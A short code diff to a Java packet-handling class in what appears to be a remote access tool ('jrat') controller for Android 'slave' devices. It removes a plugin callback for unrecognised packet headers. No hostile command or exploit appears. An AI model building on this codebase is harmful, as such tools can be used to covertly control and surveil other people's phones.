@@ -1,7 +1,6 @@
 package jrat.controller.packets.android.incoming;
 
 import jrat.common.PacketRange;
-import jrat.controller.addons.PluginEventHandler;
 import jrat.controller.android.AndroidSlave;
 
 import java.util.HashMap;
@@ -37,8 +36,6 @@ public class IncomingAndroidPackets {
 
 			if (header >= 0 && header <= PacketRange.RANGE_INCOMING) {
 				ac.read(slave, slave.getDataInputStream());
-			} else {
-				PluginEventHandler.onPacket(slave, header);
 			}
 
 			return ac != null;
